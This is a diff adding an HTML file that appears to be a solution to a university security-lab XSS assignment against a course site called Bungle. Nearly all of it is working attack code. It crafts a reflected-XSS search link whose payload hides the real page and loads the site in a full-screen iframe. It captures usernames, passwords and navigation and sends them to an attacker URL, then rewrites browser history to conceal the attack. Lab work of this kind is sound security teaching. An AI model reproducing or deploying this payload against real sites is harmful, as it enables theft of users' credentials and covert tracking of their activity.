@@ -1,0 +1,124 @@
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+function payload(attacker) 
+{
+    var targetURL="http://bungle-cs461.csl.illinois.edu/";
+    var firstFlag = 0;
+    var searchFlag=0;
+    var originalFlag=0;
+    var bufferNext="";
+    var loginIndex=0;
+    var logoutIndex=0;
+
+    function log(data) 
+    {
+        console.log($.param(data));
+        $.get(attacker, data);
+    }
+    function proxy() 
+    {
+	$('body').children().width(0);
+	$('body').children().height(0);
+        $('body').children().hide();
+        var frameUsed = $('<iframe id=_record>')
+        .attr('src',targetURL)
+        .attr('sandbox', 'allow-forms allow-scripts allow-same-origin')
+        .css({
+	        width: '100%',
+	        height: '100%',
+	        background: 'white',
+	        position: 'absolute',
+	        border: 0
+	    })
+        .appendTo('body')
+        .load(function() 
+        {
+    	    $('body',this.contentDocument)
+            .find('a')
+            .click(function() 
+	    {
+                log({event:'nav', user: $("#_record").contents().find("#logged-in-user").text(),uri: this.href});
+                window.history.replaceState({},"",this.href);
+            })
+            .end()
+    	    .find('form')
+    	    .submit(function() 
+    	    {
+                if($(this).attr('action')=="./search")
+	        {
+        		window.history.replaceState({},"","http://bungle-cs461.csl.illinois.edu/search?q=" + $("#_record").contents().find("#query").val());
+        		log({event:'nav', user: $("#_record").contents().find("#logged-in-user").text(),uri: "http://bungle-cs461.csl.illinois.edu/search?" + "q=" + $("#_record").contents().find("#query").val()});
+			searchFlag=1;
+			originalFlag=1;
+			loginIndex=0;
+			logoutIndex=0;
+			bufferNext=$("#_record").contents().find("#query").val();
+                }
+            	else if($(this).attr('action') == "./login") 
+	    	{
+			loginIndex=1;
+        		log({event: 'login', user:  $(this).serialize().substring( $(this).serialize().indexOf("=") + 1,  $(this).serialize().indexOf("&")), pass:  $(this).serialize().substring( $(this).serialize().lastIndexOf("=") + 1,  $(this).serialize().length)});
+			window.history.replaceState({},"",targetURL);
+                }
+                else if($(this).attr('action') == "./logout")
+	    	{
+			logoutIndex=1;
+           		log({event: 'logout', user: $("#_record").contents().find("#logged-in-user").text()});
+			window.history.replaceState({},"",targetURL);
+                }
+            })
+           .end();
+
+	    $("#_record").contents().find(".history-item").remove(":contains('attacker')");
+	    if(firstFlag == 0)
+	    {
+	        window.history.replaceState({},"",targetURL);
+	        log({event: "nav", user: $("#_record").contents().find("#logged-in-user").text(),uri: targetURL});
+	        firstFlag = 1;
+   	    }
+
+	    if(targetURL!=window.location.href&&searchFlag!=0&&loginIndex==0&&logoutIndex==0)
+	    {
+		if(window.history.pushState&&searchFlag==2)
+		{
+			window.history.replaceState({},"",targetURL);
+			searchFlag=1;
+			originalFlag=1;
+		}
+		else
+		searchFlag=2;	
+	    }
+	    if(targetURL==window.location.href&&originalFlag!=0&&loginIndex==0&&logoutIndex==0)
+	    {
+		if(window.history.pushState&&originalFlag==2)
+		{
+			window.history.replaceState({},"","http://bungle-cs461.csl.illinois.edu/search?q="+bufferNext);
+			searchFlag=2;
+			originalFlag=1;
+		}
+		else
+		originalFlag=2;
+	    }
+        });
+    }
+    proxy();
+}
+function makeLink(xssdefense, target, attacker) 
+{
+	if(xssdefense==0)
+	{
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+		encodeURIComponent("<script" + ">" + payload.toString() +
+		";payload(\"" +attacker + "\");</script" + ">");
+	}
+}
+var xssdefense = 0;
+var target = "http://bungle-cs461.csl.illinois.edu/";
+var attacker = "http://127.0.0.1:31337/stolen";
+$(window).on("load",function() 
+{
+	var url = makeLink(xssdefense, target, attacker);
+	window.location.href = url;
+});
+</script>
